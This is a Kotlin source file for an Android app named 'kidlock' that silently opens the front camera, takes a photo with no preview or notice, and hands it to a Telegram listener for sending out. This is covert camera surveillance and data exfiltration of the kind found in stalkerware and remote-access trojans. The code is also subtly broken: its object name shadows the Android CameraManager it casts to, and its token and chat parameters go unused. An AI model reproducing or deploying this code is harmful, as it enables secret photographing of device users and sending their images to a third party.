package com.kidlock

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

object CameraManager {

    fun captureAndSend(context: Context, botToken: String, chatId: String) {
        val thread = HandlerThread("CameraThread")
        thread.start()
        val handler = Handler(thread.looper)

        val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

        val cameraId = manager.cameraIdList.firstOrNull { id ->
            manager.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
        } ?: manager.cameraIdList.firstOrNull() ?: return

        val imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)

        manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                val surface = imageReader.surface
                val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                captureRequest.addTarget(surface)

                camera.createCaptureSession(
                    listOf(surface),
                    object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            session.capture(captureRequest.build(),
                                object : CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(
                                        s: CameraCaptureSession,
                                        r: CaptureRequest,
                                        result: TotalCaptureResult
                                    ) {
                                        val image = imageReader.acquireLatestImage()
                                        val buffer = image.planes[0].buffer
                                        val bytes = ByteArray(buffer.remaining())
                                        buffer.get(bytes)
                                        image.close()
                                        camera.close()
                                        thread.quitSafely()

                                        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
                                        val file = File(context.cacheDir, "photo_$timestamp.jpg")
                                        FileOutputStream(file).use { it.write(bytes) }

                                        TelegramListener.instance.sendPhoto(file.absolutePath)
                                    }
                                }, handler)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) {}
                    }, handler
                )
            }
            override fun onDisconnected(camera: CameraDevice) { camera.close() }
            override fun onError(camera: CameraDevice, error: Int) { camera.close() }
        }, handler)
    }
}
